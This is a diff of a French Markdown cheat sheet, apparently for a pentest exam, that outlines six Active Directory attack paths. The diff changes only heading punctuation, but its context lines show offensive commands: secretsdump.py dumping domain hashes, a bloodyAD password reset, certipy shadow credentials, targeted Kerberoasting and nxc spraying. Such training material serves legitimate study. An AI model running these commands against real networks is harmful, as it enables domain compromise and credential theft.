@@ -4,7 +4,7 @@
 
 ---
 
-## Scénario 1 — "Épreuve à tiroir" (le classique exam)
+## Scénario 1 : "Épreuve à tiroir" (le classique exam)
 
 **Contexte :** Les flags sont cachés dans les partages SMB. Chaque flag contient des informations pour trouver le suivant.
 
@@ -57,7 +57,7 @@ nxc smb $RANGE -u $FOUND_USER -p $FOUND_PWD -d $DOMAIN --continue-on-success
 
 ---
 
-## Scénario 2 — Relay NTLM → compte → énumération → DA
+## Scénario 2 : Relay NTLM → compte → énumération → DA
 
 **Contexte :** Le réseau a des machines sans signature SMB. On relay vers une machine admin.
 
@@ -115,7 +115,7 @@ secretsdump.py -hashes :$DA_HASH $DOMAIN/$DA_USER@$DC_IP -just-dc-ntlm
 
 ---
 
-## Scénario 3 — Kerberoasting → crack → escalade
+## Scénario 3 : Kerberoasting → crack → escalade
 
 **Contexte :** Un compte de service avec SPN a un mot de passe faible. BloodHound montre qu'il mène vers DA.
 
@@ -177,7 +177,7 @@ secretsdump.py $DOMAIN/$SVC_USER:'$SVC_PWD'@$DC_IP -just-dc-ntlm
 
 ---
 
-## Scénario 4 — BloodHound → chemin ACL → DA
+## Scénario 4 : BloodHound → chemin ACL → DA
 
 **Contexte :** BloodHound identifie un chemin ACL : ton compte → GenericWrite → compte B → membre de Domain Admins.
 
@@ -197,7 +197,7 @@ alice --[GenericWrite]--> svc_backup --[MemberOf]--> Domain Admins
 
 **Étape 2 : Exploiter GenericWrite**
 
-Option A — Reset du mot de passe :
+Option A : Reset du mot de passe :
 
 ```bash
 bloodyAD -u alice -p 'AlicePwd' -d $DOMAIN --dc-ip $DC_IP \
@@ -206,7 +206,7 @@ bloodyAD -u alice -p 'AlicePwd' -d $DOMAIN --dc-ip $DC_IP \
 nxc smb $DC_IP -u svc_backup -p 'Pwn3d2024!' -d $DOMAIN
 ```
 
-Option B — Shadow Credentials (sans reset visible) :
+Option B : Shadow Credentials (sans reset visible) :
 
 ```bash
 certipy shadow auto \
@@ -217,7 +217,7 @@ certipy shadow auto \
 # → Donne un TGT + hash NT pour svc_backup
 ```
 
-Option C — Targeted Kerberoasting (ajouter SPN) :
+Option C : Targeted Kerberoasting (ajouter SPN) :
 
 ```bash
 targetedKerberoast.py -d $DOMAIN_FQDN -u alice -p 'AlicePwd' \
@@ -239,7 +239,7 @@ secretsdump.py $DOMAIN/$PRIV_USER:'$PRIV_PWD'@$DC_IP -just-dc-ntlm
 
 ---
 
-## Scénario 5 — MITMv6 → RBCD → impersonation DA
+## Scénario 5 : MITMv6 → RBCD → impersonation DA
 
 **Contexte :** IPv6 actif sur le réseau, pas de DHCPv6. On crée un compte machine et on configure RBCD.
 
@@ -276,7 +276,7 @@ secretsdump.py -k -no-pass $DOMAIN/Administrator@target.entreprise.local
 
 ---
 
-## Scénario 6 — AS-REP Roasting pur (sans credentials)
+## Scénario 6 : AS-REP Roasting pur (sans credentials)
 
 **Contexte :** Pas de credentials de départ. Un compte a la pré-auth désactivée.
 
@@ -319,9 +319,9 @@ bloodhound-python -u $USER -p $PWD -d $DOMAIN_FQDN -ns $DC_IP -c All --zip
 
 | Scénario | Vecteur initial | Technique clé | Phase la plus critique |
 |----------|----------------|--------------|----------------------|
-| Épreuve tiroir | Responder / Relay | Exploration SMB | Phase 4 — chasse flags |
-| Relay NTLM | Relay SMB | ntlmrelayx SOCKS | Phase 2 — relay |
-| Kerberoasting | Compte basique | GetUserSPNs + hashcat | Phase 4 — crack |
-| ACL Abuse | BloodHound | bloodyAD / certipy shadow | Phase 5 — lecture BH |
-| MITMv6 RBCD | IPv6 | mitm6 + ntlmrelayx + getST | Phase 2 — setup |
-| AS-REP pur | RID brute | GetNPUsers sans auth | Phase 2 — sans compte |
+| Épreuve tiroir | Responder / Relay | Exploration SMB | Phase 4 : chasse flags |
+| Relay NTLM | Relay SMB | ntlmrelayx SOCKS | Phase 2 : relay |
+| Kerberoasting | Compte basique | GetUserSPNs + hashcat | Phase 4 : crack |
+| ACL Abuse | BloodHound | bloodyAD / certipy shadow | Phase 5 : lecture BH |
+| MITMv6 RBCD | IPv6 | mitm6 + ntlmrelayx + getST | Phase 2 : setup |
+| AS-REP pur | RID brute | GetNPUsers sans auth | Phase 2 : sans compte |
